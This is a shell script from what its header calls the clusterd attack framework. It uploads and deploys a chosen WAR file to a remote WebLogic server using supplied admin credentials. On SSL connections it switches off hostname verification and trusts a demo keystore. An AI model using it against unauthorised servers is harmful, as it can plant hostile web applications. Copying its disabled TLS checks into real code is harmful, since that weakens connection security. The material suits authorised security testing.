#!/bin/sh

#
# This application is part of the clusterd attack framework
#

#
# This interfaces with weblogic.Deployer to deploy WAR's to the remote WebLogic
# server.
# 
# Invocation:
#   ./web_deploy.sh [remote ip] [remote port] [WAR] [short name] [username] [password]
#
# Pass in "ssl" as the fifth argument if we are connecting to an SSL server
#

args=""
util="weblogic.Deployer"
usr="-username $5"
pswd="-password $6"

if [ $# -eq 7 ] && [ "$7" = "ssl" ]; then
    url="-adminurl t3s://$1:$2"

    # see checkauth.sh for notes on these
    ssl_fix="-Djava.security.egd=file:/dev/./urandom"
    hostname="-Dweblogic.security.SSL.ignoreHostnameVerification=true"
    dks="-Dweblogic.security.SSL.trustedCAKeyStore=../DemoTrust.jks"
    args="$ssl_fix $hostname $dks $util $url $usr $pswd"
else
    url="-adminurl t3://$1:$2"
    args="$util $url $usr $pswd"
fi

java -cp .:../wlfullclient.jar:../wlcipher.jar $args -deploy $3 -id $4 -upload 2>/dev/null
